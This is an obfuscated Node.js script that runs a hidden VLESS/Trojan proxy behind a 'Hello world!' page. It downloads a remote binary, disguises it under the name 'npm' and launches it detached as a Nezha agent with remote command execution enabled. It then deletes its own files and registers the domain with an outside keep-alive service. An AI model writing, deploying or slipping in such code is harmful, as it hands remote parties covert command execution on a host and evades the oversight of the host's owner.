const _0x329723=_0x1345;(function(_0xa59c65,_0x38bb2c){const _0x586836=_0x1345,_0x32a5c1=_0xa59c65();while(!![]){try{const _0x22ae72=parseInt(_0x586836(0x1df))/0x1+parseInt(_0x586836(0x1ef))/0x2+-parseInt(_0x586836(0x189))/0x3*(parseInt(_0x586836(0x1b1))/0x4)+-parseInt(_0x586836(0x1b7))/0x5*(parseInt(_0x586836(0x1cb))/0x6)+parseInt(_0x586836(0x1c6))/0x7*(-parseInt(_0x586836(0x1c4))/0x8)+parseInt(_0x586836(0x1d1))/0x9+parseInt(_0x586836(0x181))/0xa;if(_0x22ae72===_0x38bb2c)break;else _0x32a5c1['push'](_0x32a5c1['shift']());}catch(_0x3aeff6){_0x32a5c1['push'](_0x32a5c1['shift']());}}}(_0x3144,0x28f1d));const os=require('os'),http=require(_0x329723(0x1d5)),fs=require('fs'),axios=require(_0x329723(0x19b)),net=require('net'),path=require('path'),crypto=require(_0x329723(0x1e6)),{Buffer}=require(_0x329723(0x1d7)),{exec,execSync}=require(_0x329723(0x187)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process.env.UUID||_0x329723(0x1ed),NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',DOMAIN=process.env.DOMAIN||_0x329723(0x1f3),AUTO_ACCESS=process.env.AUTO_ACCESS||!![],WSPATH=process.env.WSPATH||UUID['slice'](0x0,0x8),SUB_PATH=process.env.SUB_PATH||_0x329723(0x1d3),NAME=process.env.NAME||'',PORT=process.env.PORT||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2e22f0=_0x329723;try{const _0x443990=await axios[_0x2e22f0(0x192)]('https://api.ip.sb/geoip'),_0x441b5f=_0x443990['data'];ISP=(_0x441b5f[_0x2e22f0(0x1af)]+'-'+_0x441b5f[_0x2e22f0(0x1b0)])[_0x2e22f0(0x17d)](/ /g,'_');}catch(_0x340189){ISP=_0x2e22f0(0x1cf);}};function _0x3144(){const _0x33c5e5=['sha224','write','text/html','50dXeOmo','readUInt8','utf-8','map','concat','false','Failed\x20to\x20resolve\x20','vless://','reduce','&fp=chrome&type=ws&host=','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','listen','\x20with\x20all\x20DNS\x20servers','16EmkdVZ','8443','1154363hbgbXg','connection','stream','config.yaml','&type=A','8280XvcoAq','pop','https://arm64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/agent','Unknown','arch','1825956aDHkaX','true','subspacex','8.8.4.4','http','data','buffer','createServer','every','readUInt16BE','https://amd64.ssss.nyc.mn/v1','/bin/bash','Status','base64','123249TAJaJa','includes','substr','find','url','length','error','crypto','aarch64','443','split','2087','type','text/plain','49067e72-29f1-4440-888e-196bb6ec2413','join','442240KzgjYd','npm','client_secret:\x20','connect','1234.abc.com','npm\x20is\x20running','test',':443?security=tls&sni=','\x20-p\x20','utf8','2096','unlink','replace','trim','createWriteStream','log','2523660exQuRa','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','readFile','close','https://dns.google/resolve?name=','child_process','writeFileSync','432438ZWckiJ','Not\x20Found\x0a','slice','&path=%2F','Automatic\x20Access\x20Task\x20added\x20successfully','npm\x20running\x20error:','Answer','npm\x20download\x20successfully','arm','get','Server\x20is\x20running\x20on\x20port\x20','end','application/dns-json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',':443?encryption=none&security=tls&sni=','application/json','1.1.1.1','writeHead','axios','decode','npm\x20is\x20already\x20running,\x20skip\x20running...','once','pipe','finish','Server','error:\x20','digest','then','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','update','trojan://','index.html','send','2083','toString','catch','post','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','country_code','isp','8cJyrEP','Hello\x20world!','--tls'];_0x3144=function(){return _0x33c5e5;};return _0x3144();}GetISP();function _0x1345(_0x57a7ab,_0x3289ba){_0x57a7ab=_0x57a7ab-0x17d;const _0x31441c=_0x3144();let _0x1345fb=_0x31441c[_0x57a7ab];return _0x1345fb;}const httpServer=http[_0x329723(0x1d8)]((_0xcee852,_0xa02832)=>{const _0x1fb867=_0x329723;if(_0xcee852[_0x1fb867(0x1e3)]==='/'){const _0x1eff90=path[_0x1fb867(0x1ee)](__dirname,_0x1fb867(0x1a8));fs[_0x1fb867(0x184)](_0x1eff90,_0x1fb867(0x1f8),(_0x301ab4,_0x10a907)=>{const _0x3f9cab=_0x1fb867;if(_0x301ab4){_0xa02832[_0x3f9cab(0x19a)](0xc8,{'Content-Type':'text/html'}),_0xa02832['end'](_0x3f9cab(0x1b2));return;}_0xa02832[_0x3f9cab(0x19a)](0xc8,{'Content-Type':_0x3f9cab(0x1b6)}),_0xa02832['end'](_0x10a907);});return;}else{if(_0xcee852[_0x1fb867(0x1e3)]==='/'+SUB_PATH){const _0x276e10=NAME?NAME+'-'+ISP:ISP,_0x4e32d6=_0x1fb867(0x1be)+UUID+'@'+DOMAIN+_0x1fb867(0x197)+DOMAIN+_0x1fb867(0x1c0)+DOMAIN+_0x1fb867(0x18c)+WSPATH+'#'+_0x276e10,_0x5e38ed=_0x1fb867(0x1a7)+UUID+'@'+DOMAIN+_0x1fb867(0x1f6)+DOMAIN+_0x1fb867(0x1c0)+DOMAIN+_0x1fb867(0x18c)+WSPATH+'#'+_0x276e10,_0x511f14=_0x4e32d6+'\x0a'+_0x5e38ed,_0x577213=Buffer['from'](_0x511f14)['toString'](_0x1fb867(0x1de));_0xa02832['writeHead'](0xc8,{'Content-Type':_0x1fb867(0x1ec)}),_0xa02832[_0x1fb867(0x194)](_0x577213+'\x0a');}else _0xa02832['writeHead'](0x194,{'Content-Type':_0x1fb867(0x1ec)}),_0xa02832[_0x1fb867(0x194)](_0x1fb867(0x18a));}}),wss=new WebSocket[(_0x329723(0x1a1))]({'server':httpServer}),uuid=UUID[_0x329723(0x17d)](/-/g,''),DNS_SERVERS=[_0x329723(0x1d4),_0x329723(0x199)];function resolveHost(_0x35d813){return new Promise((_0x246bf6,_0x16b8e4)=>{const _0x57b94a=_0x1345;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x57b94a(0x1f5)](_0x35d813)){_0x246bf6(_0x35d813);return;}let _0x3cc694=0x0;function _0x274ef0(){const _0x53eeb1=_0x57b94a;if(_0x3cc694>=DNS_SERVERS[_0x53eeb1(0x1e4)]){_0x16b8e4(new Error(_0x53eeb1(0x1bd)+_0x35d813+_0x53eeb1(0x1c3)));return;}const _0x4dd383=DNS_SERVERS[_0x3cc694];_0x3cc694++;const _0x15cc5f=_0x53eeb1(0x186)+encodeURIComponent(_0x35d813)+_0x53eeb1(0x1ca);axios[_0x53eeb1(0x192)](_0x15cc5f,{'timeout':0x1388,'headers':{'Accept':_0x53eeb1(0x195)}})[_0x53eeb1(0x1a4)](_0x34ea41=>{const _0x2403c0=_0x53eeb1,_0x169e60=_0x34ea41[_0x2403c0(0x1d6)];if(_0x169e60[_0x2403c0(0x1dd)]===0x0&&_0x169e60['Answer']&&_0x169e60[_0x2403c0(0x18f)][_0x2403c0(0x1e4)]>0x0){const _0x645d61=_0x169e60[_0x2403c0(0x18f)][_0x2403c0(0x1e2)](_0x533a87=>_0x533a87[_0x2403c0(0x1eb)]===0x1);if(_0x645d61){_0x246bf6(_0x645d61[_0x2403c0(0x1d6)]);return;}}_0x274ef0();})[_0x53eeb1(0x1ac)](_0x2db32e=>{_0x274ef0();});}_0x274ef0();});}function handleVlessConnection(_0x5c34cd,_0x290930){const _0x3e6097=_0x329723,[_0x33758c]=_0x290930,_0x822133=_0x290930['slice'](0x1,0x11);if(!_0x822133[_0x3e6097(0x1d9)]((_0xc973d2,_0x3f7275)=>_0xc973d2==parseInt(uuid['substr'](_0x3f7275*0x2,0x2),0x10)))return![];let _0x45f12e=_0x290930[_0x3e6097(0x18b)](0x11,0x12)[_0x3e6097(0x1b8)]()+0x13;const _0x346c4c=_0x290930[_0x3e6097(0x18b)](_0x45f12e,_0x45f12e+=0x2)[_0x3e6097(0x1da)](0x0),_0x13eb90=_0x290930[_0x3e6097(0x18b)](_0x45f12e,_0x45f12e+=0x1)[_0x3e6097(0x1b8)](),_0x3652bd=_0x13eb90==0x1?_0x290930['slice'](_0x45f12e,_0x45f12e+=0x4)[_0x3e6097(0x1ee)]('.'):_0x13eb90==0x2?new TextDecoder()[_0x3e6097(0x19c)](_0x290930[_0x3e6097(0x18b)](_0x45f12e+0x1,_0x45f12e+=0x1+_0x290930[_0x3e6097(0x18b)](_0x45f12e,_0x45f12e+0x1)[_0x3e6097(0x1b8)]())):_0x13eb90==0x3?_0x290930['slice'](_0x45f12e,_0x45f12e+=0x10)[_0x3e6097(0x1bf)]((_0x33857c,_0x54ba7e,_0x116703,_0x341183)=>_0x116703%0x2?_0x33857c['concat'](_0x341183[_0x3e6097(0x18b)](_0x116703-0x1,_0x116703+0x1)):_0x33857c,[])[_0x3e6097(0x1ba)](_0xb4288c=>_0xb4288c[_0x3e6097(0x1da)](0x0)['toString'](0x10))[_0x3e6097(0x1ee)](':'):'';_0x5c34cd[_0x3e6097(0x1a9)](new Uint8Array([_0x33758c,0x0]));const _0x120663=createWebSocketStream(_0x5c34cd);return resolveHost(_0x3652bd)[_0x3e6097(0x1a4)](_0x392a03=>{const _0x5eb46d=_0x3e6097;net['connect']({'host':_0x392a03,'port':_0x346c4c},function(){const _0x56dbbe=_0x1345;this[_0x56dbbe(0x1b5)](_0x290930[_0x56dbbe(0x18b)](_0x45f12e)),_0x120663['on']('error',()=>{})[_0x56dbbe(0x19f)](this)['on'](_0x56dbbe(0x1e5),()=>{})[_0x56dbbe(0x19f)](_0x120663);})['on'](_0x5eb46d(0x1e5),()=>{});})[_0x3e6097(0x1ac)](_0x251fa9=>{const _0x25822f=_0x3e6097;net[_0x25822f(0x1f2)]({'host':_0x3652bd,'port':_0x346c4c},function(){const _0x45b801=_0x25822f;this[_0x45b801(0x1b5)](_0x290930[_0x45b801(0x18b)](_0x45f12e)),_0x120663['on'](_0x45b801(0x1e5),()=>{})[_0x45b801(0x19f)](this)['on']('error',()=>{})[_0x45b801(0x19f)](_0x120663);})['on'](_0x25822f(0x1e5),()=>{});}),!![];}function handleTrojanConnection(_0x5c8320,_0x256e90){const _0x33db59=_0x329723;try{if(_0x256e90[_0x33db59(0x1e4)]<0x3a)return![];const _0x42a0a0=_0x256e90[_0x33db59(0x18b)](0x0,0x38)[_0x33db59(0x1ab)](),_0x5ad34b=[UUID];let _0x4d7c60=null;for(const _0x3f3fd8 of _0x5ad34b){const _0x289664=crypto['createHash'](_0x33db59(0x1b4))[_0x33db59(0x1a6)](_0x3f3fd8)[_0x33db59(0x1a3)]('hex');if(_0x289664===_0x42a0a0){_0x4d7c60=_0x3f3fd8;break;}}if(!_0x4d7c60)return![];let _0x3ba5f7=0x38;_0x256e90[_0x3ba5f7]===0xd&&_0x256e90[_0x3ba5f7+0x1]===0xa&&(_0x3ba5f7+=0x2);const _0x160d75=_0x256e90[_0x3ba5f7];if(_0x160d75!==0x1)return![];_0x3ba5f7+=0x1;const _0x2fa9c5=_0x256e90[_0x3ba5f7];_0x3ba5f7+=0x1;let _0x5814d9,_0x1b4617;if(_0x2fa9c5===0x1)_0x5814d9=_0x256e90[_0x33db59(0x18b)](_0x3ba5f7,_0x3ba5f7+0x4)[_0x33db59(0x1ee)]('.'),_0x3ba5f7+=0x4;else{if(_0x2fa9c5===0x3){const _0x2f4a7a=_0x256e90[_0x3ba5f7];_0x3ba5f7+=0x1,_0x5814d9=_0x256e90['slice'](_0x3ba5f7,_0x3ba5f7+_0x2f4a7a)[_0x33db59(0x1ab)](),_0x3ba5f7+=_0x2f4a7a;}else{if(_0x2fa9c5===0x4)_0x5814d9=_0x256e90[_0x33db59(0x18b)](_0x3ba5f7,_0x3ba5f7+0x10)['reduce']((_0x5eca5c,_0x80b4b6,_0x4d67a5,_0x155977)=>_0x4d67a5%0x2?_0x5eca5c[_0x33db59(0x1bb)](_0x155977[_0x33db59(0x18b)](_0x4d67a5-0x1,_0x4d67a5+0x1)):_0x5eca5c,[])[_0x33db59(0x1ba)](_0x70b2a9=>_0x70b2a9[_0x33db59(0x1da)](0x0)[_0x33db59(0x1ab)](0x10))['join'](':'),_0x3ba5f7+=0x10;else return![];}}_0x1b4617=_0x256e90[_0x33db59(0x1da)](_0x3ba5f7),_0x3ba5f7+=0x2;_0x3ba5f7<_0x256e90[_0x33db59(0x1e4)]&&_0x256e90[_0x3ba5f7]===0xd&&_0x256e90[_0x3ba5f7+0x1]===0xa&&(_0x3ba5f7+=0x2);const _0x142e6b=createWebSocketStream(_0x5c8320);return resolveHost(_0x5814d9)[_0x33db59(0x1a4)](_0x182fd9=>{const _0x5302fa=_0x33db59;net[_0x5302fa(0x1f2)]({'host':_0x182fd9,'port':_0x1b4617},function(){const _0xd82ac8=_0x5302fa;_0x3ba5f7<_0x256e90['length']&&this['write'](_0x256e90[_0xd82ac8(0x18b)](_0x3ba5f7)),_0x142e6b['on'](_0xd82ac8(0x1e5),()=>{})[_0xd82ac8(0x19f)](this)['on'](_0xd82ac8(0x1e5),()=>{})[_0xd82ac8(0x19f)](_0x142e6b);})['on'](_0x5302fa(0x1e5),()=>{});})[_0x33db59(0x1ac)](_0x3738ef=>{net['connect']({'host':_0x5814d9,'port':_0x1b4617},function(){const _0x5d9dfc=_0x1345;_0x3ba5f7<_0x256e90[_0x5d9dfc(0x1e4)]&&this[_0x5d9dfc(0x1b5)](_0x256e90[_0x5d9dfc(0x18b)](_0x3ba5f7)),_0x142e6b['on'](_0x5d9dfc(0x1e5),()=>{})[_0x5d9dfc(0x19f)](this)['on']('error',()=>{})[_0x5d9dfc(0x19f)](_0x142e6b);})['on']('error',()=>{});}),!![];}catch(_0x37ca96){return![];}}wss['on'](_0x329723(0x1c7),(_0x5dfdbe,_0x5561dc)=>{const _0xfd1d1c=_0x329723,_0x69168b=_0x5561dc[_0xfd1d1c(0x1e3)]||'';_0x5dfdbe[_0xfd1d1c(0x19e)]('message',_0x9f2dad=>{const _0x3d31a3=_0xfd1d1c;if(_0x9f2dad[_0x3d31a3(0x1e4)]>0x11&&_0x9f2dad[0x0]===0x0){const _0x5542d4=_0x9f2dad[_0x3d31a3(0x18b)](0x1,0x11),_0x24f2b1=_0x5542d4[_0x3d31a3(0x1d9)]((_0xa7aa47,_0x1a1c14)=>_0xa7aa47==parseInt(uuid[_0x3d31a3(0x1e1)](_0x1a1c14*0x2,0x2),0x10));if(_0x24f2b1){!handleVlessConnection(_0x5dfdbe,_0x9f2dad)&&_0x5dfdbe[_0x3d31a3(0x185)]();return;}}!handleTrojanConnection(_0x5dfdbe,_0x9f2dad)&&_0x5dfdbe['close']();})['on'](_0xfd1d1c(0x1e5),()=>{});});const getDownloadUrl=()=>{const _0x209557=_0x329723,_0x1c0fdc=os[_0x209557(0x1d0)]();return _0x1c0fdc===_0x209557(0x191)||_0x1c0fdc==='arm64'||_0x1c0fdc===_0x209557(0x1e7)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x209557(0x1cd):!NEZHA_PORT?_0x209557(0x1db):_0x209557(0x1ce);},downloadFile=async()=>{const _0x5a71ab=_0x329723;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x29dc19=getDownloadUrl(),_0x4cea5d=await axios({'method':_0x5a71ab(0x192),'url':_0x29dc19,'responseType':_0x5a71ab(0x1c8)}),_0x32f238=fs[_0x5a71ab(0x17f)](_0x5a71ab(0x1f0));return _0x4cea5d[_0x5a71ab(0x1d6)][_0x5a71ab(0x19f)](_0x32f238),new Promise((_0x1dc85d,_0x5096fb)=>{const _0x30be99=_0x5a71ab;_0x32f238['on'](_0x30be99(0x1a0),()=>{const _0x1605e7=_0x30be99;console[_0x1605e7(0x180)](_0x1605e7(0x190)),exec('chmod\x20+x\x20npm',_0x5039f2=>{if(_0x5039f2)_0x5096fb(_0x5039f2);_0x1dc85d();});}),_0x32f238['on'](_0x30be99(0x1e5),_0x5096fb);});}catch(_0x21ecf6){throw _0x21ecf6;}},runnz=async()=>{const _0x46da42=_0x329723;try{const _0x5c208a=execSync(_0x46da42(0x183),{'encoding':_0x46da42(0x1b9)});if(_0x5c208a[_0x46da42(0x17e)]()!==''){console[_0x46da42(0x180)](_0x46da42(0x19d));return;}}catch(_0x43c308){}await downloadFile();let _0x2b435b='',_0x2371b3=[_0x46da42(0x1e8),_0x46da42(0x1c5),_0x46da42(0x1f9),_0x46da42(0x1ea),_0x46da42(0x1aa),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x276b28=_0x2371b3[_0x46da42(0x1e0)](NEZHA_PORT)?_0x46da42(0x1b3):'';_0x2b435b='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x46da42(0x1f7)+NEZHA_KEY+'\x20'+_0x276b28+_0x46da42(0x1c1);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x582365=NEZHA_SERVER[_0x46da42(0x1e0)](':')?NEZHA_SERVER[_0x46da42(0x1e9)](':')[_0x46da42(0x1cc)]():'',_0x13959f=_0x2371b3[_0x46da42(0x1e0)](_0x582365)?_0x46da42(0x1d2):_0x46da42(0x1bc),_0x32cad0=_0x46da42(0x1f1)+NEZHA_KEY+_0x46da42(0x196)+NEZHA_SERVER+_0x46da42(0x182)+_0x13959f+_0x46da42(0x1ae)+UUID;fs[_0x46da42(0x188)](_0x46da42(0x1c9),_0x32cad0);}_0x2b435b='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x46da42(0x180)](_0x46da42(0x1a5));return;}}try{exec(_0x2b435b,{'shell':_0x46da42(0x1dc)},_0xd4ff2=>{const _0x3c1312=_0x46da42;if(_0xd4ff2)console[_0x3c1312(0x1e5)](_0x3c1312(0x18e),_0xd4ff2);else console[_0x3c1312(0x180)](_0x3c1312(0x1f4));});}catch(_0x439003){console[_0x46da42(0x1e5)](_0x46da42(0x1a2)+_0x439003);}};async function addAccessTask(){const _0x563b28=_0x329723;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5845da='https://'+DOMAIN;try{const _0x333a30=await axios[_0x563b28(0x1ad)]('https://oooo.serv00.net/add-url',{'url':_0x5845da},{'headers':{'Content-Type':_0x563b28(0x198)}});console['log'](_0x563b28(0x18d));}catch(_0x27fffd){}}const delFiles=()=>{const _0x4dd64c=_0x329723;fs[_0x4dd64c(0x1fa)]('npm',()=>{}),fs['unlink'](_0x4dd64c(0x1c9),()=>{});};httpServer[_0x329723(0x1c2)](PORT,()=>{const _0x552395=_0x329723;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x552395(0x180)](_0x552395(0x193)+PORT);});
